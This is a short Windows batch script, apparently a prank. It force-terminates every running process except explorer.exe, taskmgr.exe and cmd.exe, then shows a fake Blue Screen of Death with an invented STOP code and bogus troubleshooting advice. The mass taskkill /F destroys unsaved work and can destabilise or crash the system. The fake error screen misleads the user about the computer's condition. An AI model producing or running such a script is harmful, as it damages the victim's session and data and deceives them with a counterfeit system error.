@echo off
:: Enable delayed variable expansion so that variables inside FOR loops are updated correctly
setlocal enabledelayedexpansion

:: Close non-essential applications first
echo Closing non-essential applications...
tasklist /FI "STATUS eq running" > tasklist.txt

for /F "skip=3 tokens=1,2" %%A in (tasklist.txt) do (
    set "proc_name=%%A"
    set "proc_pid=%%B"

    :: Exclude essential Windows processes
    if /I "!proc_name!" NEQ "explorer.exe" (
        if /I "!proc_name!" NEQ "taskmgr.exe" (
            if /I "!proc_name!" NEQ "cmd.exe" (
                taskkill /F /PID !proc_pid! >nul 2>&1
                echo Terminated process: !proc_name!
            )
        )
    )
)

:: Now simulate the BSOD
color 1F
cls
echo A problem has been detected and Windows has been shut down to prevent damage to your computer.
echo.
echo Technical information:
echo *** STOP: 0x0000007B (0xFFFFFA8004AC56E0, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)
echo.
echo If this is the first time you've seen this stop error screen, restart your computer. If this screen appears again, follow these steps:
echo Check for viruses on your computer. Remove any newly installed hard drives or hard drive controllers. Check your hard drive to make sure it is properly configured and terminated.
echo Run CHKDSK /F to check for hard drive corruption, and then restart your computer.
echo.
echo Press any key to continue...
pause >nul
